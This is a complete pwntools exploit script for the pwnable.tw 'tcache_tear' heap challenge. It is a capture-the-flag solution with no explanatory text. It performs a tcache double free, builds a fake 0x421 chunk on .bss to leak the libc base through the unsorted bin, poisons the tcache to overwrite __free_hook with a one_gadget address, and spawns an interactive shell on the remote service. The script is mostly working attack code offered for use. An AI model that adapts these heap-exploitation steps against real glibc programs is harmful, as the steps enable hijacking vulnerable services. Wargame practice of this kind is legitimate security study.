#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("tcache_tear_patched", checksec=False)
libc = ELF("libc.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
b *0x0000000000601d78
set follow-fork-mode parent
set detach-on-fork on
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(0.5)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10207
        return remote(host, port)

p = conn()

def malloc(size, data):
    slan(p, b'choice', 1)
    slan(p, b'Size', size)
    if size != 0x10:
        sa(p, b'Data', data)
        sleep(0.05)

def free():
    slan(p, b'choice', 2)

def print_name():
    slan(p, b'choice', 3)

sa(p, b'Name', flat(0, 0x421))

name = 0x00602060

# Fake chunk on bss
malloc(0x8, pad())
free()
free()
malloc(0x8, p64(name))
malloc(0x8, p64(0))
malloc(0x8, flat(
    0, 0x421,
    0, 0,
    0, name + 0x10,
    pad(0x3f0),
    0, 0x21,
    pad(0x10),
    0, 0x21
))

# Free fake chunk to unsorted bin
free()

# Leak libc
print_name()
ru(p, b'Name :')
rn(p, 16)
libc.address = leak_bytes(rn(p, 6), 0x3ebca0)
lg("libc base", libc.address)

# Malloc till chunk is taken from the top chunk
for i in range(7):
    malloc(0x90, pad())

free()
free()

free_hook = libc.symbols['__free_hook']
lg("free hook", free_hook)
malloc(0x90, p64(free_hook - 0x8))
malloc(0x90, p64(0))

one_gadget = libc.address + 0x4f322
lg("one gadget", one_gadget)
malloc(0x90, flat(0, one_gadget))

print("spawn shell")
free()

rr(p, 1)
ia(p)